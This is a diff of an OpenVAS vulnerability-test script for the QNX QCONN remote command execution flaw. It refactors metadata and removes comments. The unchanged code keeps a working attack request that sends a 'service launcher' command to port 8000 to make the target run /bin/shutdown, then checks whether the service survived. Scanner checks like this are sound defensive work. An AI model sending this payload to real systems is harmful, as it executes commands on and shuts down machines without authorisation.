@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_qnx_qconn_rtos_remote_code_exec_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
+# $Id: gb_qnx_qconn_rtos_remote_code_exec_vuln.nasl 11357 2018-09-12 10:57:05Z asteins $
 #
 # QNX QCONN Remote Command Execution Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802461");
-  script_version("$Revision: 4690 $");
+  script_version("$Revision: 11357 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:57:05 +0200 (Wed, 12 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-09-26 13:12:00 +0530 (Wed, 26 Sep 2012)");
   script_name("QNX QCONN Remote Command Execution Vulnerability");
   script_category(ACT_DENIAL);
@@ -43,42 +43,23 @@ if(description)
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/21520/");
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/116877/QNX-QCONN-Remote-Command-Execution.html");
 
-  tag_impact = "Successful exploitation may allow remote attackers to execute
-  arbitrary code or cause a denial of service condition and compromise the system.
-
-  Impact Level: System/Application";
-
-  tag_affected = "QNX version 6.5.0 and prior";
-
-  tag_insight = "The flaw is due to error in 'QCONN' when handling the crafted
+  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
+  arbitrary code or cause a denial of service condition and compromise the system.");
+  script_tag(name:"affected", value:"QNX version 6.5.0 and prior");
+  script_tag(name:"insight", value:"The flaw is due to error in 'QCONN' when handling the crafted
   requests. This can be exploited to execute arbitrary code  via a specially
-  crafted packet sent to port 8000.";
-
-  tag_solution = "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.";
-
-  tag_summary = "This host is running QNX RTOS and is prone to remote code
-  execution vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  crafted packet sent to port 8000.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is running QNX RTOS and is prone to remote code
+  execution vulnerability.");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"WillNotFix");
 
   exit(0);
 }
-
-## Variable Initialization
-port= "";
-soc = "";
-res = "";
-req = "";
 
 ## Default Port
 port = 8000;
@@ -92,7 +73,6 @@ if(!soc){
   exit(0);
 }
 
-## Check Banner And Confirm Application
 res = recv(socket:soc, length:1024);
 if("QCONN" >!< res)
 {
@@ -100,7 +80,6 @@ if("QCONN" >!< res)
   exit(0);
 }
 
-## Construct the attack request
 req = string("service launcher\n",
              "start/flags ", port, " /bin/shutdown /bin/shutdown -b\n",
              "continue\n");
@@ -109,10 +88,8 @@ req = string("service launcher\n",
 send(socket:soc, data:req);
 close(soc);
 
-## Waiting
 sleep(3);
 
-## Try to Open Socket
 if(soc =  open_sock_tcp(port))
 {
   res = recv(socket:soc, length:1024);
